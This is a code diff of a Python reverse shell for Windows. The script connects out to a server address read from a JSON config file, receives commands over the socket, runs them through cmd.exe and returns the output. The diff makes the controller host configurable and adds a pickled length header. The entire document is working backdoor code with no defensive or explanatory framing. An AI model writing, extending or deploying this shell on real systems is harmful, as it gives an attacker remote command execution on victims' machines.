@@ -1,12 +1,18 @@
-import socket, os, sys
+import socket, os, sys, pickle, json
 import subprocess as sp
 from time import sleep
 
+def get_arguments():
+    with open("PRMTR.json", "r+") as file:
+        args = json.load(file)
+        return args
+
 if __name__ == ("__main__"):
+    args = get_arguments()
     socket = socket.socket()
-    socket.connect(("192.168.1.44", 8080))
+    socket.connect((args["server_ip"], args["server_port"]))
     while True:
-        command = socket.recv(4096).decode()
+        command = socket.recv(4096).decode(encoding="latin1")
         if command == ("exit"):
             socket.close()
             sys.exit()
@@ -15,5 +21,7 @@ if __name__ == ("__main__"):
                 os.chdir(command[3:])
         run = sp.run(["cmd.exe", "/C", command], capture_output=True, shell=True,
         text=True, universal_newlines=True).stdout
-        run = run.encode()
+        output_length = len(run)
+        socket.send(pickle.dumps(output_length))
+        run = run.encode(encoding="latin1")
         socket.send(run)
